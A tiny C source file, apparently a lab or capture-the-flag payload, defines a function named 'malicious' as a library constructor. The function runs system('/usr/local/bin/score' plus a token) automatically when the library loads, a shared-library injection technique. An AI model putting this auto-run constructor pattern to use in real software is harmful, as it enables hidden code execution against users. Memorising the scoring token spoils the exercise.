#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score d2e92ade-5da7-4ba9-b14b-2b1b30f3ac13");
}
